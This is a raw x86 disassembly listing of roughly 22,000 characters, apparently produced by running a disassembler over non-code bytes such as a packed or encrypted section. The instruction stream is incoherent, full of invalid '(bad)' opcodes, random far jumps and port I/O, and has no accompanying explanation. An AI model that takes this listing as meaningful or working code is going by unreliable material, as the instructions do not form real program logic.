  40fb0b:	or     edi,DWORD PTR [ebx]
  40fb0d:	adc    esi,DWORD PTR [bx+si-0x4737]
  40fb12:	jl     0x40fb6c
  40fb14:	push   0xc417406d
  40fb19:	or     DWORD PTR [ebx+0x13],edx
  40fb1c:	lds    esi,FWORD PTR [ebx+0x4d]
  40fb1f:	jge    0x40fb8a
  40fb21:	adc    ah,BYTE PTR [ebx-0x13]
  40fb24:	dec    esi
  40fb25:	test   BYTE PTR [edi+esi*4-0x2b3f51e8],dl
  40fb2c:	retf   
  40fb2d:	add    edx,DWORD PTR [ebp-0x10]
  40fb30:	xchg   BYTE PTR [ecx+edx*1-0x14],ah
  40fb34:	lock pushf 
  40fb36:	(bad)  
  40fb37:	lock mov ds:0xf9e0ab91,al
  40fb3d:	adc    bl,bl
  40fb3f:	mov    cl,BYTE PTR [ecx+0x67]
  40fb42:	imul   esi,DWORD PTR [ecx],0x54
  40fb45:	(bad)  
  40fb46:	gs retf 
  40fb48:	pop    es
  40fb49:	nop
  40fb4a:	adc    dl,BYTE PTR [edi+0x19decfee]
  40fb50:	(bad)  [edi+ebp*1]
  40fb53:	jno    0x40fb6a
  40fb55:	cmp    eax,0x122b33f8
  40fb5a:	out    0x57,al
  40fb5c:	call   0x2985:0xe436fa6b
  40fb63:	mov    eax,0x958eea5d
  40fb68:	mov    esi,0xea316fd7
  40fb6d:	loop   0x40fb8a
  40fb6f:	sbb    BYTE PTR [ebp+ebp*1-0x2c],cl
  40fb73:	retf   0xfa24
  40fb76:	mov    esp,0x379d5df7
  40fb7b:	pop    esi
  40fb7c:	jbe    0x40fbaa
  40fb7e:	cmp    eax,0x441c63c6
  40fb83:	fisttp QWORD PTR [eax]
  40fb85:	ror    BYTE PTR [ebx+0x441a2d1f],1
  40fb8b:	add    eax,DWORD PTR [eax]
  40fb8d:	shl    BYTE PTR [ebp+0x501cb186],1
  40fb93:	lahf   
  40fb94:	sub    esp,DWORD PTR [edi-0x67]
  40fb97:	cli    
  40fb98:	dec    esi
  40fb99:	daa    
  40fb9a:	inc    edx
  40fb9b:	adc    eax,edx
  40fb9d:	jmp    0xef10:0xd8865afc
  40fba4:	in     al,0x9c
  40fba6:	clc    
  40fba7:	xor    eax,0x8c64d268
  40fbac:	jns    0x40fbe9
  40fbae:	mov    dl,0xb2
  40fbb0:	in     al,dx
  40fbb1:	add    al,0x6c
  40fbb3:	mov    al,0x1f
  40fbb5:	fiadd  DWORD PTR [edi-0x3a7b67a1]
  40fbbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbbc:	in     al,dx
  40fbbd:	xor    eax,0x67d3d620
  40fbc2:	inc    ecx
  40fbc3:	das    
  40fbc4:	push   esi
  40fbc5:	mov    gs,WORD PTR [ebp-0x73061454]
  40fbcb:	jmp    0x40fbc4
  40fbcd:	loope  0x40fbd3
  40fbcf:	pop    ss
  40fbd0:	(bad)  
  40fbd2:	sub    DWORD PTR [eax],esi
  40fbd4:	inc    esp
  40fbd5:	rol    DWORD PTR [ebp+0x61e6821],cl
  40fbdb:	xchg   ecx,eax
  40fbdc:	adc    eax,0x1888bab1
  40fbe1:	js     0x40fc2b
  40fbe3:	sub    DWORD PTR [ebx+0x34],esp
  40fbe6:	add    BYTE PTR [eax+0x487f9357],ch
  40fbec:	jne    0x40fb8c
  40fbee:	jbe    0x40fc3f
  40fbf0:	mov    WORD PTR [ecx-0x5c],ds
  40fbf3:	pop    edi
  40fbf4:	ss mov ah,0x83
  40fbf7:	daa    
  40fbf8:	shr    bl,0x42
  40fbfb:	dec    ebp
  40fbfc:	add    eax,0xb6151c13
  40fc01:	bound  ebp,QWORD PTR [ebx]
  40fc03:	sbb    DWORD PTR [edi],esp
  40fc05:	xchg   esp,eax
  40fc06:	sub    al,0xe5
  40fc08:	cld    
  40fc09:	or     dl,dl
  40fc0b:	sbb    ebx,esp
  40fc0d:	jg     0x40fbe0
  40fc0f:	add    bh,BYTE PTR [eax-0x1a]
  40fc12:	mov    al,ds:0xcdc2bb81
  40fc17:	data16 rol BYTE PTR es:[edi+0x2e57036b],1
  40fc1f:	xor    bh,ah
  40fc21:	repz cli 
  40fc23:	xchg   esi,eax
  40fc24:	mov    DWORD PTR [ebp-0x68],ebx
  40fc27:	int    0x42
  40fc29:	mov    edx,0xc29cf5da
  40fc2e:	xor    ebx,DWORD PTR [edx]
  40fc30:	sbb    cl,BYTE PTR [eax-0x4444dad0]
  40fc36:	fdivr  QWORD PTR [ecx+0x790fa331]
  40fc3c:	push   ecx
  40fc3d:	cld    
  40fc3e:	pop    edx
  40fc3f:	mov    bl,0x5f
  40fc41:	dec    ebx
  40fc42:	(bad)  
  40fc43:	mov    ax,ds:0xeffc04f5
  40fc49:	cmp    BYTE PTR [edx+ebx*2],0x1e
  40fc4d:	lock cli 
  40fc4f:	sahf   
  40fc50:	fnsave [edi+0x47]
  40fc53:	(bad)  
  40fc54:	in     eax,0x97
  40fc56:	xchg   ch,bl
  40fc58:	jne    0x40fc61
  40fc5a:	jp     0x40fc05
  40fc5c:	sbb    eax,DWORD PTR [ebx]
  40fc5e:	outs   dx,DWORD PTR ds:[esi]
  40fc5f:	pop    DWORD PTR [ebx+0x31fbf360]
  40fc65:	fidivr DWORD PTR [eax+0x6c8c74be]
  40fc6b:	sbb    DWORD PTR [eax],esi
  40fc6d:	dec    eax
  40fc6e:	stc    
  40fc6f:	xor    DWORD PTR [esi+0x4a],esp
  40fc72:	jnp    0x40fc23
  40fc74:	mov    eax,ds:0x24cab258
  40fc79:	lahf   
  40fc7a:	jmp    0x40fcd2
  40fc7c:	jl     0x40fce7
  40fc7e:	sbb    BYTE PTR [ebx],bl
  40fc80:	aad    0x1
  40fc82:	lea    ebx,[esi+0x22]
  40fc85:	adc    esi,edi
  40fc87:	pop    edi
  40fc88:	add    DWORD PTR [eax],esi
  40fc8a:	fiadd  DWORD PTR [edx+0x6ccc7865]
  40fc90:	xchg   esi,eax
  40fc91:	div    dh
  40fc93:	out    dx,al
  40fc94:	loop   0x40fce1
  40fc96:	clc    
  40fc97:	sahf   
  40fc98:	cmp    al,0x51
  40fc9a:	dec    esi
  40fc9b:	pop    es
  40fc9c:	les    eax,FWORD PTR [ecx+eax*1+0x8]
  40fca0:	retf   0x62b4
  40fca3:	add    BYTE PTR [eax],ch
  40fca5:	test   eax,0xf5bf9be9
  40fcaa:	adc    eax,0xa7b3eb33
  40fcaf:	(bad)  
  40fcb0:	stc    
  40fcb1:	mov    ds,WORD PTR [ecx-0x47]
  40fcb4:	adc    BYTE PTR [ecx],dh
  40fcb6:	xchg   edi,eax
  40fcb7:	jmp    0x9ec0:0xf58f7e09
  40fcbe:	out    0x21,al
  40fcc0:	sub    BYTE PTR [ecx-0x6aa316b2],bl
  40fcc6:	dec    esp
  40fcc7:	lods   eax,DWORD PTR ds:[esi]
  40fcc8:	loop   0x40fc72
  40fcca:	fwait
  40fccb:	(bad)  
  40fccc:	sub    ebx,edx
  40fcce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fccf:	lods   al,BYTE PTR ds:[esi]
  40fcd0:	pop    esp
  40fcd1:	call   0xced886e4
  40fcd6:	leave  
  40fcd7:	adc    DWORD PTR [edi-0x9],ebp
  40fcda:	xchg   edi,eax
  40fcdb:	push   cs
  40fcdc:	pop    ss
  40fcdd:	adc    dl,BYTE PTR [eax+0x64]
  40fce0:	stc    
  40fce1:	in     eax,dx
  40fce2:	sbb    BYTE PTR [ecx],bl
  40fce4:	xchg   dh,dh
  40fce6:	test   eax,0xf3a29949
  40fceb:	push   ebx
  40fcec:	test   eax,0x1a66884a
  40fcf1:	push   ecx
  40fcf2:	add    al,0xf1
  40fcf4:	adc    eax,0x9ef02687
  40fcf9:	mov    ?,WORD PTR [eax]
  40fcfb:	adc    esp,DWORD PTR [ebx]
  40fcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcfe:	mov    ?,WORD PTR [ebp-0xc]
  40fd01:	inc    esi
  40fd02:	push   0xffffffe7
  40fd04:	ror    bh,cl
  40fd06:	adc    BYTE PTR [esi+0xe],bl
  40fd09:	mov    WORD PTR [ebx],ds
  40fd0b:	push   esi
  40fd0c:	jnp    0x40fcd3
  40fd0e:	jecxz  0x40fd1d
  40fd10:	sub    BYTE PTR [ebx],dh
  40fd12:	je     0x40fd29
  40fd14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd15:	cmp    eax,0xce656263
  40fd1a:	jae    0x40fd93
  40fd1c:	stc    
  40fd1d:	shr    DWORD PTR [esi+0x42],cl
  40fd20:	ss xor eax,eax
  40fd23:	das    
  40fd24:	or     al,bl
  40fd26:	aad    0x1d
  40fd28:	cmp    al,0x1
  40fd2a:	mov    gs,WORD PTR [eax+0x46e56eca]
  40fd30:	or     BYTE PTR [ebp-0x77b1186d],dh
  40fd36:	fld    QWORD PTR ds:0x1d2836a1
  40fd3c:	pop    esi
  40fd3d:	fadd   QWORD PTR [edx+0x7b41a439]
  40fd43:	mov    eax,ds:0xaa2bf9aa
  40fd48:	add    DWORD PTR [edx-0x2a],edi
  40fd4b:	jmp    0x6a59:0x47a92853
  40fd52:	sti    
  40fd53:	jo     0x40fd26
  40fd55:	mov    DWORD PTR [edi+0x10dac442],ecx
  40fd5b:	into   
  40fd5c:	jns    0x40fda6
  40fd5e:	xor    bh,BYTE PTR [ebx-0x52942e50]
  40fd64:	adc    ebx,DWORD PTR [ebp+edx*1+0x24303411]
  40fd6b:	xchg   DWORD PTR [ecx],eax
  40fd6d:	push   ecx
  40fd6e:	cld    
  40fd6f:	outs   dx,DWORD PTR ds:[esi]
  40fd70:	add    edx,DWORD PTR ds:0xff9274ad
  40fd76:	out    0x4f,eax
  40fd78:	jmp    0x40fde1
  40fd7a:	int    0x7c
  40fd7c:	data16 mov WORD PTR [edx],cs
  40fd7f:	ja     0x40fdc4
  40fd81:	pusha  
  40fd82:	in     eax,0xcf
  40fd84:	pop    edi
  40fd85:	fbld   TBYTE PTR [edi-0x6395943d]
  40fd8b:	push   ebx
  40fd8c:	ss add edi,eax
  40fd8f:	out    dx,eax
  40fd90:	mov    bh,0x6e
  40fd92:	retf   
  40fd93:	mov    eax,ds:0xf4375001
  40fd98:	xlat   BYTE PTR ds:[ebx]
  40fd99:	and    DWORD PTR [ebx+0x6eddc5],ecx
  40fd9f:	push   ecx
  40fda0:	cld    
  40fda1:	lds    esi,FWORD PTR [esi]
  40fda3:	push   esi
  40fda4:	dec    edx
  40fda5:	popf   
  40fda6:	es scas eax,DWORD PTR es:[edi]
  40fda8:	jl     0x40fdd0
  40fdaa:	fild   WORD PTR [edx+ebx*1-0x23]
  40fdae:	jne    0x40fd8f
  40fdb0:	xor    DWORD PTR [esi+0x6b],edi
  40fdb3:	mov    dh,0x3e
  40fdb5:	jb     0x40fe1f
  40fdb7:	(bad)  
  40fdb9:	pop    ebp
  40fdba:	sete   ch
  40fdbd:	cmp    DWORD PTR [eax-0xe],0xffffffb0
  40fdc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdc2:	and    eax,0x3e86cbf
  40fdc7:	jmp    FWORD PTR [ebx-0x53732e45]
  40fdcd:	lock popa 
  40fdcf:	pusha  
  40fdd0:	call   0x2e1e8c83
  40fdd5:	lea    eax,[ecx]
  40fdd7:	cmp    BYTE PTR ds:0xe0bce8df,ch
  40fddd:	icebp  
  40fdde:	mov    ecx,0x8ee55917
  40fde3:	scas   eax,DWORD PTR es:[edi]
  40fde4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40fde6:	cmp    al,0xb6
  40fde8:	mov    al,0x53
  40fdea:	fcomp  DWORD PTR [edx+0x40]
  40fdee:	lds    ecx,FWORD PTR [ebx]
  40fdf0:	and    eax,0x7f2e8320
  40fdf5:	jmp    0xdb1d25f6
  40fdfa:	jge    0x40fe00
  40fdfc:	dec    eax
  40fdfd:	jg     0x40fe00
  40fdff:	jns    0x40fdbb
  40fe01:	jle    0x40fe77
  40fe03:	cld    
  40fe04:	iret   
  40fe05:	out    dx,eax
  40fe06:	lods   eax,DWORD PTR ds:[esi]
  40fe07:	scas   eax,DWORD PTR es:[edi]
  40fe08:	jg     0x40fe3e
  40fe0a:	ds dec esp
  40fe0c:	mov    cl,0x77
  40fe0e:	adc    ebp,DWORD PTR [ebx-0xf0ef9be]
  40fe14:	pop    esp
  40fe15:	gs inc ecx
  40fe17:	cmovs  eax,DWORD PTR [edx+0x58]
  40fe1b:	pop    ds
  40fe1c:	pop    ss
  40fe1d:	lods   eax,DWORD PTR ds:[esi]
  40fe1e:	mov    ds:0xd37a6383,al
  40fe23:	sub    BYTE PTR [esi-0x223f22c6],ah
  40fe29:	push   ebp
  40fe2a:	mov    dh,0x76
  40fe2c:	mov    bl,0x90
  40fe2e:	dec    edi
  40fe2f:	loope  0x40fe15
  40fe31:	mov    cl,0xc2
  40fe33:	fcomp  DWORD PTR ds:0xbecb2af8
  40fe39:	jp     0x40fe06
  40fe3b:	sub    al,0x46
  40fe3d:	xor    BYTE PTR [edi],dl
  40fe3f:	lods   al,BYTE PTR ds:[esi]
  40fe40:	outs   dx,DWORD PTR ds:[esi]
  40fe41:	btc    DWORD PTR [esi+0x2e],ebx
  40fe45:	xor    eax,0x93c7dd22
  40fe4a:	stos   DWORD PTR es:[edi],eax
  40fe4b:	or     BYTE PTR [eax],bh
  40fe4d:	lahf   
  40fe4e:	test   BYTE PTR [eax-0x576ecd17],0xdc
  40fe55:	dec    ebx
  40fe56:	mov    dl,0xf1
  40fe58:	mov    eax,0xdc40f423
  40fe5d:	add    esi,eax
  40fe5f:	push   ecx
  40fe60:	lock mov dh,0x9c
  40fe63:	(bad)  
  40fe65:	mov    ds:0xcfbe275f,al
  40fe6a:	hlt    
  40fe6b:	scas   al,BYTE PTR es:[edi]
  40fe6c:	clc    
  40fe6d:	mov    edi,0x642d30c3
  40fe72:	xchg   ebx,eax
  40fe73:	int3   
  40fe74:	push   ebx
  40fe75:	dec    eax
  40fe76:	shl    DWORD PTR [ebp+ebp*4+0x7f0c71a6],1
  40fe7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe7e:	pop    ebp
  40fe7f:	mov    bh,0x9c
  40fe81:	js     0x6417447e
  40fe87:	mov    ebx,0x78cbb0a9
  40fe8c:	(bad)  
  40fe8d:	and    al,0x22
  40fe8f:	retf   
  40fe90:	or     ebp,DWORD PTR [ecx+0x7a]
  40fe93:	and    DWORD PTR [eax-0x72f5dfd3],ebp
  40fe99:	xor    BYTE PTR [esi],0xb0
  40fe9c:	or     al,0x6c
  40fe9e:	add    bh,BYTE PTR [ebp-0x6f]
  40fea1:	sbb    ebp,DWORD PTR [bx]
  40fea4:	inc    edi
  40fea5:	jecxz  0x40feff
  40fea7:	jmp    0x40fecc
  40fea9:	inc    esi
  40feaa:	dec    esp
  40feab:	cli    
  40feac:	div    BYTE PTR [ebp+0x2fa3737e]
  40feb2:	das    
  40feb3:	and    eax,DWORD PTR [ecx+0x2b1fa094]
  40feb9:	add    DWORD PTR [edx+eiz*4-0x3dcb7fcd],ecx
  40fec0:	dec    ebp
  40fec1:	inc    eax
  40fec2:	mov    DWORD PTR [ebx],edx
  40fec4:	dec    esi
  40fec5:	repz mov eax,ds:0xb7640757
  40fecb:	sahf   
  40fecc:	sar    BYTE PTR ds:0x6c2bb31d,cl
  40fed2:	push   ds
  40fed3:	fcomp  DWORD PTR [ecx-0x42]
  40fed6:	and    al,0xba
  40fed8:	dec    edi
  40fed9:	es in  eax,dx
  40fedb:	addr16 mov ecx,fs
  40fede:	jge    0x40fedc
  40fee0:	cli    
  40fee1:	imul   edx,DWORD PTR [edi-0x9accb11],0x460952bb
  40feeb:	js     0x40ff59
  40feed:	push   esi
  40feee:	push   eax
  40feef:	mov    bh,0x16
  40fef1:	lock bound edx,QWORD PTR [edi]
  40fef4:	and    bp,WORD PTR [esi]
  40fef7:	cmp    BYTE PTR [eax],0x54
  40fefa:	sbb    DWORD PTR es:[esi-0x9216d3a],esp
  40ff01:	add    al,0xda
  40ff03:	add    ebp,DWORD PTR [eax-0x758e9021]
  40ff09:	ins    BYTE PTR es:[edi],dx
  40ff0a:	lock jl 0x40feaf
  40ff0d:	jae    0x40ff03
  40ff0f:	sbb    BYTE PTR [ecx-0x19],bl
  40ff12:	sbb    dl,BYTE PTR [edx-0x7f]
  40ff15:	jle    0x40ff6a
  40ff17:	int    0x9a
  40ff19:	sbb    BYTE PTR [edx-0x5ad576ee],dl
  40ff1f:	jno    0x40ff82
  40ff21:	std    
  40ff22:	inc    edi
  40ff23:	cs inc edi
  40ff25:	pushf  
  40ff26:	out    dx,eax
  40ff27:	aaa    
  40ff28:	mov    bh,BYTE PTR [ebx]
  40ff2a:	pop    es
  40ff2b:	push   edx
  40ff2c:	arpl   ax,sp
  40ff2e:	xor    al,0xa3
  40ff30:	mov    edx,0x6f7ef676
  40ff35:	stos   BYTE PTR es:[edi],al
  40ff36:	cwde   
  40ff37:	jmp    0x739cf4c8
  40ff3c:	push   cs
  40ff3d:	inc    edi
  40ff3e:	loopne 0x40ffa1
  40ff40:	pop    ebx
  40ff41:	retf   0x38ee
  40ff44:	mov    WORD PTR [eax+0x46bc12fa],gs
  40ff4a:	fcmovnbe st,st(4)
  40ff4c:	dec    edx
  40ff4d:	loop   0x40ff9e
  40ff4f:	ret    0xb213
  40ff52:	dec    ebp
  40ff53:	jle    0x40feed
  40ff55:	mov    cl,0x22
  40ff57:	jg     0x40ff1e
  40ff59:	jne    0x40ff49
  40ff5b:	mov    edx,0xc15ec6cc
  40ff60:	ret    0x6840
  40ff63:	xchg   DWORD PTR [ebx+0x6bfec0a3],esp
  40ff69:	push   ebp
  40ff6a:	clc    
  40ff6b:	test   DWORD PTR [esi+ecx*1],esi
  40ff6e:	stos   BYTE PTR es:[edi],al
  40ff6f:	sub    al,0x6f
  40ff71:	bound  esi,QWORD PTR [ebx+0x1b4e3abf]
  40ff77:	rol    DWORD PTR [ebx-0x12fd2e07],0x43
  40ff7e:	push   edi
  40ff7f:	mov    bh,0xf5
  40ff81:	dec    ebp
  40ff82:	aas    
  40ff83:	dec    edx
  40ff84:	push   cs
  40ff85:	not    DWORD PTR [edi-0x313d440f]
  40ff8b:	mov    ebp,0xde12ff33
  40ff90:	xor    eax,0xd1db3828
  40ff95:	push   ss
  40ff96:	push   ebp
  40ff97:	push   ebp
  40ff98:	clc    
  40ff99:	leave  
  40ff9a:	test   DWORD PTR [ebx+0x6e030262],0x7888ddd5
  40ffa4:	fiadd  DWORD PTR [eax+edx*1]
  40ffa7:	outs   dx,DWORD PTR ds:[esi]
  40ffa8:	mov    bh,0x77
  40ffaa:	jmp    0x64772
  40ffaf:	lods   eax,DWORD PTR ds:[esi]
  40ffb0:	outs   dx,DWORD PTR ds:[esi]
  40ffb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffb2:	test   eax,0x6ba0e3aa
  40ffb7:	cmp    edx,DWORD PTR [edx+0x54]
  40ffba:	sbb    ebp,esp
  40ffbc:	stc    
  40ffbd:	int3   
  40ffbe:	addr16 add ebx,0xbab91e18
  40ffc5:	mov    bh,0xb1
  40ffc7:	ins    BYTE PTR es:[edi],dx
  40ffc8:	imul   esp,DWORD PTR [edx+eiz*4+0x40026eef],0xc42f4ff5
  40ffd3:	pop    esp
  40ffd4:	sbb    DWORD PTR [ebp-0x6a],ebp
  40ffd7:	ror    dh,1
  40ffd9:	and    al,0x80
  40ffdb:	daa    
  40ffdc:	jp     0x40ff92
  40ffde:	div    DWORD PTR [ebx-0x63]
  40ffe1:	adc    DWORD PTR [edx+0x13],edx
  40ffe4:	inc    DWORD PTR [edx+0x3f]
  40ffe7:	in     al,dx
  40ffe8:	cmc    
  40ffe9:	xchg   edi,eax
  40ffea:	sub    al,0xae
  40ffec:	ftst   
  40ffee:	mov    al,0xb1
  40fff0:	icebp  
  40fff1:	fadd   st,st(5)
  40fff3:	pop    ecx
  40fff4:	ins    BYTE PTR es:[edi],dx
  40fff5:	das    
  40fff6:	xchg   esp,eax
  40fff7:	inc    ebp
  40fff8:	sbb    BYTE PTR [esi+0x70ebf193],0xa6
  40ffff:	popa   
  410000:	repnz or eax,0xc7d6fb29
  410006:	test   BYTE PTR ds:0x3196a800,bh
  41000c:	(bad)  
  41000d:	push   ss
  41000e:	adc    ch,BYTE PTR [eax+edi*1-0xfb2b358]
  410015:	pop    esp
  410016:	lds    esi,FWORD PTR [esi-0x2dd0ab00]
  41001c:	and    al,0x53
  41001e:	fnstenv [esi+0x60059d1c]
  410024:	shl    DWORD PTR [edx+ebp*1-0x66],1
  410028:	ds pop ds
  41002a:	and    BYTE PTR [ecx-0x18],ah
  41002d:	ins    BYTE PTR es:[edi],dx
  41002e:	frstor [eax+0x103e5520]
  410034:	pop    es
  410035:	push   ds
  410036:	(bad)  
  410037:	xchg   ebp,eax
  410038:	adc    al,0xaf
  41003a:	xchg   BYTE PTR [ecx+0x1e],bh
  41003d:	push   esp
  41003e:	stos   BYTE PTR es:[edi],al
  41003f:	push   esi
  410040:	bound  edi,QWORD PTR [esi-0x47ef0592]
  410046:	push   0x77
  410048:	jge    0x40ffd4
  41004a:	pop    edx
  41004b:	cmp    DWORD PTR [ebp+0x37825832],edi
  410051:	mov    ah,0xee
  410053:	mov    ds:0xd9825d29,eax
  410058:	or     cl,BYTE PTR [ecx-0x51]
  41005b:	std    
  41005c:	push   ebp
  41005d:	cmp    eax,0x625c6f7d
  410062:	push   ds
  410063:	(bad)  
  410064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410065:	cmc    
  410066:	jg     0x410012
  410068:	(bad)  
  410069:	cmp    edi,eax
  41006b:	clc    
  41006c:	out    dx,al
  41006d:	mov    ds,WORD PTR [ebx-0x4a77be40]
  410073:	and    al,0xbe
  410075:	sbb    ecx,edx
  410077:	jge    0x410062
  410079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41007a:	rol    BYTE PTR [edx+0x16],cl
  41007d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007e:	ror    DWORD PTR [ebx-0x4024180d],0xbb
  410085:	push   ebp
  410086:	loopne 0x41007c
  410088:	xor    al,ch
  41008a:	dec    eax
  41008b:	mov    ebp,0x53520127
  410090:	inc    ebp
  410091:	stos   DWORD PTR es:[edi],eax
  410092:	icebp  
  410093:	push   ds
  410094:	(bad)  
  410095:	mov    al,0xe0
  410097:	sbb    BYTE PTR [ebp-0x76],bl
  41009a:	sar    cl,1
  41009c:	jns    0x410047
  41009e:	jl     0x41009a
  4100a0:	das    
  4100a1:	in     al,dx
  4100a2:	pusha  
  4100a3:	sahf   
  4100a4:	jmp    0x39d2:0xf4842f43
  4100ab:	add    DWORD PTR [esi+0x68],ebp
  4100ae:	or     eax,0x82b5ff88
  4100b3:	(bad)  
  4100b4:	push   esi
  4100b5:	inc    BYTE PTR [esi]
  4100b7:	call   0x8bd5926f
  4100bc:	(bad)  
  4100bd:	mov    ah,0xd
  4100bf:	test   ebx,ebx
  4100c1:	fst    DWORD PTR [edi]
  4100c3:	ror    BYTE PTR [ebx-0x61],0xa
  4100c7:	dec    esp
  4100c8:	push   eax
  4100c9:	out    dx,eax
  4100ca:	sub    eax,0xd826d3c1
  4100cf:	scas   eax,DWORD PTR es:[edi]
  4100d0:	imul   ebp,DWORD PTR [ebx-0x4ce28878],0xffffffc7
  4100d7:	jbe    0x2ba56e0
  4100dd:	js     0x410084
  4100df:	mov    ch,0x2a
  4100e1:	mov    bh,0xb0
  4100e3:	adc    eax,0x5da286c1
  4100e8:	mov    al,0xf8
  4100ea:	ret    0x871b
  4100ed:	adc    BYTE PTR [ebx-0x17aa06e9],0x78
  4100f4:	repz adc cl,bh
  4100f7:	adc    al,0xd2
  4100f9:	(bad)  
  4100fb:	mov    dh,0x66
  4100fd:	in     al,0x24
  4100ff:	cmp    eax,0x5e8f1cae
  410104:	push   ds
  410105:	inc    edx
  410106:	ins    BYTE PTR es:[edi],dx
  410107:	add    DWORD PTR [esi+0x5],esi
  41010a:	in     al,dx
  41010b:	hlt    
  41010c:	repnz jmp 0xba89:0xcfa7027e
  410114:	and    al,0xd2
  410116:	jg     0x4100b2
  410118:	mov    esp,0xa17b537c
  41011d:	adc    eax,0xa53df4fb
  410122:	mov    ch,0x2b
  410124:	and    DWORD PTR [ebp-0x6ba9c390],0xffffffe5
  41012b:	xlat   BYTE PTR ds:[ebx]
  41012c:	xor    al,0x16
  41012e:	in     eax,dx
  41012f:	(bad)  
  410130:	and    esi,ebp
  410132:	pop    esi
  410133:	pop    edx
  410134:	dec    edx
  410135:	mov    DWORD PTR [ebx],0x42b70de7
  41013b:	cmp    esp,DWORD PTR [esi+0x2570b04f]
  410141:	sbb    edx,DWORD PTR [edi+0x43]
  410144:	test   eax,0x2495f27
  410149:	in     al,dx
  41014a:	push   0xffffffc1
  41014c:	jecxz  0x410193
  41014e:	pop    edi
  41014f:	jbe    0x4100da
  410151:	ret    
  410152:	inc    eax
  410153:	jae    0x4101a4
  410155:	out    0xc5,al
  410157:	mov    al,ds:0x58ffa98b
  41015c:	pop    eax
  41015d:	mov    edx,0xb02503f0
  410162:	xor    esi,esp
  410164:	test   al,0xf8
  410166:	xchg   ebx,eax
  410167:	outs   dx,BYTE PTR ds:[esi]
  410168:	mov    DWORD PTR [ebp+ebx*8+0x293f19c5],ebp
  41016f:	jb     0x410125
  410171:	neg    BYTE PTR ds:0x6fdd7a33
  410177:	inc    ecx
  410178:	aaa    
  410179:	std    
  41017a:	out    dx,al
  41017b:	dec    edi
  41017c:	stos   DWORD PTR es:[edi],eax
  41017d:	push   0xffffffc9
  41017f:	(bad)  
  410180:	outs   dx,BYTE PTR ds:[esi]
  410181:	pop    ds
  410182:	cld    
  410183:	jecxz  0x4101e6
  410185:	sub    eax,0x1e0e95e3
  41018a:	pop    ss
  41018b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018c:	sbb    al,0xdc
  41018e:	mov    ebp,0xd0f64327
  410193:	pop    es
  410194:	ins    DWORD PTR es:[edi],dx
  410195:	out    0xda,eax
  410197:	test   eax,0xb628fef3
  41019c:	stos   DWORD PTR es:[edi],eax
  41019d:	shl    BYTE PTR [ebx-0x10c77079],1
  4101a3:	push   esi
  4101a4:	sbb    BYTE PTR [edi+0x1331e535],bh
  4101aa:	les    ebx,FWORD PTR fs:[edx]
  4101ad:	sahf   
  4101ae:	mov    al,ds:0x560f202a
  4101b3:	aad    0x1d
  4101b5:	or     eax,0xb945fa6a
  4101ba:	jae    0x4101a2
  4101bc:	pop    esi
  4101bd:	mov    ch,0x49
  4101bf:	lods   eax,DWORD PTR es:[esi]
  4101c1:	dec    ecx
  4101c2:	lock shl edx,cl
  4101c5:	xor    al,0xa6
  4101c7:	sbb    DWORD PTR gs:[edx+eiz*8+0x2c6b12bc],ebp
  4101cf:	gs pop esp
  4101d1:	xchg   BYTE PTR [esi+0x5e],dl
  4101d4:	add    DWORD PTR ds:0xe441bfd8,ecx
  4101da:	mov    al,0xa6
  4101dc:	ins    DWORD PTR es:[edi],dx
  4101dd:	in     al,dx
  4101de:	les    eax,FWORD PTR [esi]
  4101e0:	ds cmp edi,eax
  4101e3:	pop    ss
  4101e4:	or     al,0xf9
  4101e6:	push   0xffffffc1
  4101e8:	xchg   ax,ax
  4101ea:	push   ds
  4101eb:	mov    eax,ds:0x2dd8b83d
  4101f0:	jg     0x41023b
  4101f2:	dec    ebx
  4101f3:	mov    eax,0xbd872a4a
  4101f8:	mov    eax,ds:0xcd987f28
  4101fd:	and    DWORD PTR [esi],ecx
  4101ff:	loope  0x410270
  410201:	xchg   BYTE PTR [ecx],al
  410203:	in     al,dx
  410204:	xchg   esi,eax
  410205:	inc    esi
  410206:	sbb    eax,DWORD PTR [eax-0x73]
  410209:	out    dx,eax
  41020a:	xchg   ebp,eax
  41020b:	push   esp
  41020c:	pop    ebp
  41020d:	push   ss
  41020e:	mov    al,0x3
  410210:	mov    gs,WORD PTR [esi+ebp*1]
  410213:	lahf   
  410214:	aam    0xca
  410216:	inc    eax
  410217:	mov    ebp,cs
  410219:	push   esi
  41021a:	cmp    edi,esp
  41021c:	arpl   di,ax
  41021e:	dec    esp
  41021f:	xor    BYTE PTR gs:[ebp-0x4db80a56],al
  410226:	mov    bh,0x16
  410228:	adc    esp,DWORD PTR [ebx+0x5a]
  41022b:	push   ebx
  41022c:	in     al,dx
  41022d:	fild   DWORD PTR [ecx]
  41022f:	add    DWORD PTR [edi],0x10
  410232:	mov    eax,0x485c83fd
  410237:	push   ebp
  410238:	sahf   
  410239:	mov    dh,0x29
  41023b:	bound  ecx,QWORD PTR [edx]
  41023d:	jg     0x410250
  41023f:	ja     0x410294
  410241:	adc    al,0x4d
  410243:	or     bh,BYTE PTR [ecx+0x7c]
  410246:	sub    al,0x83
  410248:	xor    eax,0xb178c7b1
  41024d:	jae    0x410278
  41024f:	mov    DWORD PTR [eax+0xa],ecx
  410252:	mov    eax,0xd3f67f46
  410257:	fs in  al,0x2c
  41025a:	test   DWORD PTR [eiz*2-0x7b34489d],ebx
  410261:	pusha  
  410262:	into   
  410263:	dec    ecx
  410264:	sub    esi,DWORD PTR [ebx+0x55]
  410267:	mov    gs,edx
  410269:	add    BYTE PTR [ebp+0x6b58c920],cl
  41026f:	xor    eax,0xa00891de
  410274:	mov    ds:0x3d85c737,al
  410279:	in     eax,dx
  41027a:	xlat   BYTE PTR ds:[ebx]
  41027b:	add    eax,0x6767af41
  410280:	jmp    0x4102b4
  410282:	mov    cl,0x7d
  410284:	jns    0x410221
  410286:	jne    0x410269
